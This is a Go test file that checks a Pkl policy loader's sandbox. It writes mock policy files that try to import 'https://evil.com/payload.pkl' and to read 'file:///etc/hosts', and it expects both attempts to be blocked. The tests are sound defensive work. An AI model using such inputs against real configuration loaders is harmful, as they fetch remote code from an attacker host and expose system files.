package policy

import (
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

func TestPklSandboxBlocksExternalHTTP(t *testing.T) {
	if _, err := exec.LookPath("pkl"); err != nil {
		t.Skip("pkl binary not found in PATH; skipping test")
	}
	// Create a mock Pkl file that attempts: import "https://evil.com/payload.pkl"
	tmpDir := t.TempDir()
	policyPath := filepath.Join(tmpDir, "evil_http.pkl")
	content := []byte(`import "https://evil.com/payload.pkl"`)
	if err := os.WriteFile(policyPath, content, 0600); err != nil {
		t.Fatalf("failed to write mock policy: %v", err)
	}

	_, err := loadFromPkl(policyPath)
	if err == nil {
		t.Fatal("expected sandbox to block external HTTP import, but it succeeded")
	}

	if !strings.Contains(err.Error(), "module") && !strings.Contains(err.Error(), "allowed") {
		t.Errorf("expected module restriction error, got: %v", err)
	}
}

func TestPklSandboxBlocksFileEscape(t *testing.T) {
	if _, err := exec.LookPath("pkl"); err != nil {
		t.Skip("pkl binary not found in PATH; skipping test")
	}
	// Create a mock Pkl file that attempts: read("file:///etc/hosts")
	tmpDir := t.TempDir()
	policyPath := filepath.Join(tmpDir, "evil_file.pkl")
	content := []byte(`
text = read("file:///etc/hosts").text
`)
	if err := os.WriteFile(policyPath, content, 0600); err != nil {
		t.Fatalf("failed to write mock policy: %v", err)
	}

	_, err := loadFromPkl(policyPath)
	if err == nil {
		t.Fatal("expected sandbox to block file escape, but it succeeded")
	}

	if !strings.Contains(err.Error(), "resource") && !strings.Contains(err.Error(), "allowed") {
		t.Errorf("expected resource restriction error, got: %v", err)
	}
}
